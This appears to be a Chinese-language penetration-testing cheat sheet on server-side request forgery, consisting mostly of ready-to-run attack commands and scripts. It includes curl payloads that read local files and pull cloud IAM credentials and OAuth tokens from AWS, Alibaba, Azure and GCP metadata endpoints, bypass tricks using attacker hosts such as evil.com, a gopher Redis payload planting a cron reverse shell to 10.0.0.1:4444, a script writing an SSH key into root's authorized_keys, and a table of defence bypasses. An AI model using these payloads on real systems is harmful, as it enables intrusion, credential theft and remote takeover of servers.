---
id: 03-004
title: "🔗 SSRF - 服务端请求伪造 (Server-Side Request Forgery)"
category: 漏洞利用
category_en: Exploitation
difficulty: ★★★
tools: "Gopherus, SSRFmap, Burp Collaborator"
last_updated: 2025-07
tags: ["exploitation", "web-attack", "sql-injection", "penetration-testing", "metasploit"]
subdomain: exploitation
nist_csf: ["DE.CM-08", "PR.IP-12"]
mitre_attack: ["T1190", "T1505", "T1203", "T1210"]
---
# 🔗 SSRF - 服务端请求伪造 (Server-Side Request Forgery)

## 概述
SSRF漏洞允许攻击者诱使服务器向任意地址发起请求，攻击内部系统、读取云元数据或进行内网端口扫描。

## 核心技能

### 1. SSRF基础检测

```bash
# URL参数检测
curl -s "https://example.com/fetch?url=http://127.0.0.1:80"
curl -s "https://example.com/fetch?url=http://localhost:8080"
curl -s "https://example.com/fetch?url=http://[::1]:80"

# 文件协议读取
curl -s "https://example.com/fetch?url=file:///etc/passwd"
curl -s "https://example.com/fetch?url=file:///c:/windows/win.ini"

# 端口扫描
for port in 22 80 443 3306 6379 8080 8443 9200 27017; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "https://example.com/fetch?url=http://127.0.0.1:$port")
  echo "Port $port: $code"
done
```

### 2. 云元数据API利用

```bash
# AWS元数据
curl -s "https://example.com/fetch?url=http://169.254.169.254/latest/meta-data/"
curl -s "https://example.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
curl -s "https://example.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role"
curl -s "https://example.com/fetch?url=http://169.254.169.254/latest/user-data/"
curl -s "https://example.com/fetch?url=http://169.254.169.254/latest/meta-data/public-keys/"

# 阿里云
curl -s "https://example.com/fetch?url=http://100.100.100.200/latest/meta-data/"
curl -s "https://example.com/fetch?url=http://100.100.100.200/latest/meta-data/ram/security-credentials/"
curl -s "https://example.com/fetch?url=http://100.100.100.200/user-data/"

# 腾讯云
curl -s "https://example.com/fetch?url=http://metadata.tencentyun.com/latest/meta-data/"
curl -s "https://example.com/fetch?url=http://metadata.tencentyun.com/latest/meta-data/cvm/instance-id"

# 华为云
curl -s "https://example.com/fetch?url=http://169.254.169.254/latest/meta-data/"
curl -s "https://example.com/fetch?url=http://169.254.169.254/openstack/latest/securitykey"

# Azure
curl -s "https://example.com/fetch?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01"
curl -s "https://example.com/fetch?url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# GCP
curl -s "https://example.com/fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
curl -s "https://example.com/fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/"
```

### 3. SSRF绕过技术

```bash
# DNS重绑定
# 使用像1u.ms或rbndr.us这样的服务
curl -s "https://example.com/fetch?url=http://1u.ms"  # 第一次解析到外部IP
# 第二次解析到127.0.0.1

# URL解析差异绕过
# 使用@符号
curl -s "https://example.com/fetch?url=http://evil.com@127.0.0.1"
curl -s "https://example.com/fetch?url=http://127.0.0.1:80@evil.com"

# 使用#符号
curl -s "https://example.com/fetch?url=http://evil.com#127.0.0.1"

# IPv6绕过
curl -s "https://example.com/fetch?url=http://[::1]:80"
curl -s "https://example.com/fetch?url=http://[0:0:0:0:0:ffff:7f00:1]:80"

# 十进制IP绕过
curl -s "https://example.com/fetch?url=http://2130706433:80"  # 127.0.0.1 = 2130706433
curl -s "https://example.com/fetch?url=http://3232235521:80"  # 192.168.0.1 = 3232235521

# 八进制IP绕过
curl -s "https://example.com/fetch?url=http://0177.0.0.1:80"

# 短URL绕过
curl -s "https://example.com/fetch?url=http://0:80"  # 0.0.0.0 = localhost

# DNS解析到127.0.0.1
curl -s "https://example.com/fetch?url=http://internal.localhost"
curl -s "https://example.com/fetch?url=http://localhost.test"

# IPv4映射IPv6
curl -s "https://example.com/fetch?url=http://[::ffff:127.0.0.1]:80"

# 重定向绕过
# 在自己的服务器上设置302重定向到内网地址
curl -s "https://example.com/fetch?url=http://evil.com/redirect.php"
# redirect.php:
# <?php header('Location: http://169.254.169.254/latest/meta-data/'); ?>
```

### 4. 内网服务攻击

```bash
# 攻击Redis（未授权）
curl -s "https://example.com/fetch?url=gopher://127.0.0.1:6379/_*1%0d%0a\$8%0d%0aflushall%0d%0a*3%0d%0a\$3%0d%0aset%0d%0a\$1%0d%0a1%0d%0a\$25%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/10.0.0.1/4444 0>&1%0a%0a%0a%0a%0d%0a*4%0d%0a\$6%0d%0aconfig%0d%0a\$3%0d%0aset%0d%0a\$3%0d%0adir%0d%0a\$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a\$6%0d%0aconfig%0d%0a\$3%0d%0aset%0d%0a\$10%0d%0adbfilename%0d%0a\$4%0d%0aroot%0d%0a*1%0d%0a\$4%0d%0asave%0d%0aquit%0d%0a"

# 攻击Elasticsearch
curl -s -X PUT "https://example.com/fetch?url=http://127.0.0.1:9200/_all/_settings" \
  -d '{"index.blocks.read_only_allow_delete": null}'

# 攻击Memcached
curl -s "https://example.com/fetch?url=gopher://127.0.0.1:11211/_set%20key%200%200%204%0d%0atest"

# 攻击MySQL
curl -s "https://example.com/fetch?url=mysql://root:password@127.0.0.1:3306/test"

# 攻击内部Web服务
curl -s "https://example.com/fetch?url=http://127.0.0.1:8080/actuator/health"
curl -s "https://example.com/fetch?url=http://127.0.0.1:8080/actuator/env"
curl -s "https://example.com/fetch?url=http://127.0.0.1:8080/swagger-ui.html"
curl -s "https://example.com/fetch?url=http://127.0.0.1:9200/_cat/indices"
```

### 5. SSRF+Redis组合提权

```bash
# Gopher协议操作Redis
# 生成Gopher payload
python3 << 'EOF'
import urllib.parse

def generate_redis_payload(commands):
    payload = ""
    for cmd in commands:
        payload += f"*{len(cmd)}\r\n"
        for arg in cmd:
            payload += f"${len(arg)}\r\n{arg}\r\n"
    return urllib.parse.quote(payload)

# 写SSH公钥
commands = [
    ["FLUSHALL"],
    ["SET", "sshkey", "\n\nssh-rsa AAAAB3NzaC1yc2EA... your-key\n\n"],
    ["CONFIG", "SET", "dir", "/root/.ssh/"],
    ["CONFIG", "SET", "dbfilename", "authorized_keys"],
    ["SAVE"]
]

payload = generate_redis_payload(commands)
print(f"gopher://127.0.0.1:6379/_{payload}")
EOF
```

### 6. SSRF自动化扫描

```python
#!/usr/bin/env python3
# ssrf_scanner.py - SSRF自动化检测

import requests
import threading

class SSRFDector:
    def __init__(self, target, callback_server="your-server.com"):
        self.target = target
        self.callback = callback_server

    def test_url_param(self):
        """测试URL参数SSRF"""
        payloads = [
            f"http://{self.callback}:4444/test",
            f"http://127.0.0.1:80",
            f"file:///etc/passwd",
            f"dict://localhost:8123",
            f"gopher://localhost:6379/_test"
        ]
        for payload in payloads:
            r = requests.get(self.target, params={"url": payload})
            if self.callback in r.text or "root:" in r.text:
                print(f"[+] SSRF found with: {payload}")

    def blind_test(self):
        """盲SSRF检测"""
        payload = f"http://{self.callback}:4444/ssrf-test"
        r = requests.get(self.target, params={"url": payload})
        print(f"[*] Sent blind SSRF to {self.callback}")

    def full_scan(self):
        """完全扫描"""
        self.test_url_param()
        self.blind_test()

if __name__ == "__main__":
    scanner = SSRFDector("https://example.com/fetch")
    scanner.full_scan()
```

### 7. 协议利用

```bash
# dict协议 - 探测服务
curl -s "https://example.com/fetch?url=dict://127.0.0.1:6379/INFO"
curl -s "https://example.com/fetch?url=dict://127.0.0.1:3306/status"

# gopher协议 - 向TCP服务发送任意数据
# 格式: gopher://host:port/_<urlencoded-data>
curl -s "https://example.com/fetch?url=gopher://127.0.0.1:6379/_PING%0D%0A"

# file协议 - 读取文件
curl -s "https://example.com/fetch?url=file:///etc/passwd"
curl -s "https://example.com/fetch?url=file:///proc/1/environ"

# ftp协议 - 内网FTP扫描
curl -s "https://example.com/fetch?url=ftp://anonymous:test@127.0.0.1:21"

# s3协议 - 访问S3
curl -s "https://example.com/fetch?url=s3://internal-bucket"

# phar协议（PHP反序列化）
curl -s "https://example.com/fetch?url=phar://test.phar/test.txt"
```

## SSRF防御绕过速查

| 防御方式 | 绕过方法 |
|:---|:---|
| IP黑名单 | 十进制/八进制IP、IPv6映射、DNS重绑定 |
| 域名白名单 | URL解析差异（@/#）、开放重定向 |
| 协议限制 | 使用dict/gopher/file等替代协议 |
| DNS验证 | 使用重定向绕过DNS检查 |
| 限制回连 | 连接到其他主机上的相同服务 |
| WAF检测 | 双重编码、分块编码 |

## 常用工具

| 工具 | 用途 | 链接 |
|:---|:---|:---|
| SSRFmap | SSRF自动化利用 | https://github.com/swisskyrepo/SSRFmap |
| Gopherus | Gopher payload生成 | https://github.com/tarunkant/Gopherus |
| Interactsh | 带外检测 | https://github.com/projectdiscovery/interactsh |
| SSRF-Testing | SSRF测试集 | https://github.com/cujanovic/SSRF-Testing |

## 参考资源
- [OWASP SSRF](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)
- [SSRF Bible](https://docs.google.com/document/d/1v1TkWZtrhzRLy0bYXBcdLUedXGb9njTNIJXa3u9akHM/)
- [HackTricks - SSRF](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery)
- [PayloadsAllTheThings - SSRF](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
